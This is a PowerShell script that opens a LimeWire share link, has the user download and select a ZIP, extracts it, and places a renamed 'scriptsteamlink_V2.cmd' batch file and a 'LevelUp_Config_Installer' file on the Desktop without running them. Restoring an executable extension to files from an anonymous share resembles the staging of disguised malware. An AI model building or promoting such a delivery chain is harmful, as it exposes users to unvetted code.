$ErrorActionPreference = "Stop"

$shareUrl = "https://limewire.com/d/C3n1p#ppw8anaW0P"
$desktop = [Environment]::GetFolderPath("Desktop")
$downloads = Join-Path $env:USERPROFILE "Downloads"
$tempExtract = Join-Path $env:TEMP ("LimeWire_extract_" + [guid]::NewGuid().ToString("N"))

Write-Host ""
Write-Host "1) Opening the LimeWire link in your browser..." -ForegroundColor Cyan
Start-Process $shareUrl
Write-Host ""
Write-Host "Download the ZIP from the browser first."
Write-Host "When the download is complete, return here and press Enter."
[void](Read-Host "Press Enter when the ZIP has finished downloading")

Add-Type -AssemblyName System.Windows.Forms
$dialog = New-Object System.Windows.Forms.OpenFileDialog
$dialog.Title = "Select the ZIP file you downloaded from LimeWire"
$dialog.Filter = "ZIP archives (*.zip)|*.zip|All files (*.*)|*.*"
$dialog.InitialDirectory = $downloads
$dialog.Multiselect = $false

if ($dialog.ShowDialog() -ne [System.Windows.Forms.DialogResult]::OK) {
    Write-Host "No file selected. Nothing was changed." -ForegroundColor Yellow
    Read-Host "Press Enter to exit"
    exit
}

$zipPath = $dialog.FileName
if ([IO.Path]::GetExtension($zipPath) -ne ".zip") {
    Write-Host "The selected file does not have a .zip extension. Nothing was extracted." -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

try {
    New-Item -ItemType Directory -Path $tempExtract -Force | Out-Null
    Write-Host ""
    Write-Host "2) Extracting ZIP..." -ForegroundColor Cyan
    Expand-Archive -LiteralPath $zipPath -DestinationPath $tempExtract -Force

    $scriptTxt = Get-ChildItem -LiteralPath $tempExtract -Recurse -File |
        Where-Object { $_.Name -ieq "scriptsteamlink_V2.cmd.txt" } |
        Select-Object -First 1

    $installer = Get-ChildItem -LiteralPath $tempExtract -Recurse -File |
        Where-Object { $_.BaseName -ieq "LevelUp_Config_Installer" -or $_.Name -ieq "LevelUp_Config_Installer" } |
        Select-Object -First 1

    if ($scriptTxt) {
        $scriptDest = Join-Path $desktop "scriptsteamlink_V2.cmd"
        Copy-Item -LiteralPath $scriptTxt.FullName -Destination $scriptDest -Force
        Write-Host "Copied and renamed (NOT RUN): $scriptDest" -ForegroundColor Green
    } else {
        Write-Host "Could not find scriptsteamlink_V2.cmd.txt in the extracted files." -ForegroundColor Yellow
    }

    if ($installer) {
        $installerDest = Join-Path $desktop $installer.Name
        Copy-Item -LiteralPath $installer.FullName -Destination $installerDest -Force
        Write-Host "Copied installer file to Desktop (NOT RUN): $installerDest" -ForegroundColor Green
    } else {
        Write-Host "Could not find a file named LevelUp_Config_Installer (with or without an extension)." -ForegroundColor Yellow
        Write-Host "If its filename has an extra suffix, check the extracted folder manually."
    }

    Write-Host ""
    Write-Host "Finished. No downloaded or copied file was executed." -ForegroundColor Cyan
    Write-Host "Extracted working files are in: $tempExtract"
    Write-Host "Please scan the files before opening or running them."
}
catch {
    Write-Host "An error occurred: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "No files were executed."
}
finally {
    Read-Host "Press Enter to exit"
}
